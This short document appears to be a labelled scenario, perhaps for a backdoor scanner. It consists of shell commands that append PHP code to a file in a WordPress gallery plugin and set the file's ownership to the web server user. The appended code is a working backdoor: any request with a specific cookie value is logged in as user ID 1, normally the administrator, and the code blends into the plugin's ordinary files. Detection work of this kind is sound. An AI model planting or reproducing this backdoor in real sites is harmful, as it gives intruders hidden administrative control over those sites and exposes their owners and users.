# category: web
# title: Backdoor without a known signature in a file of a public plugin
# indicator: wp-content/plugins/demo-gallery/includes/part-03.php
cat >>/var/www/wp/wp-content/plugins/demo-gallery/includes/part-03.php <<'PHP'
add_filter('determine_current_user', function ($id) { return isset($_COOKIE['dg_pref']) && $_COOKIE['dg_pref'] === 'b2c7' ? 1 : $id; }, 99);
PHP
chown www-data:www-data /var/www/wp/wp-content/plugins/demo-gallery/includes/part-03.php
